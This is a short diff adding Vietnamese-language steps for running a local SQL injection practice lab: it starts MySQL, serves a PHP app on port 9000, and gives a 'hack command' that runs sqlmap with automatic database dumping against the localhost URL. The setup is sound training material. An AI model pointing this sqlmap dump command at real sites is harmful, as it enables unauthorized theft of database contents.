@@ -1,0 +1,5 @@
+--- CACH CHAY LAB SQL INJECTION ---
+1. Bat Database: sudo service mysql start
+2. Bat Server: php -S 0.0.0.0:9000
+3. Link test: http://localhost:9000/index.php?id=1
+4. Lenh hack: sqlmap -u "http://localhost:9000/index.php?id=1" --batch --dump
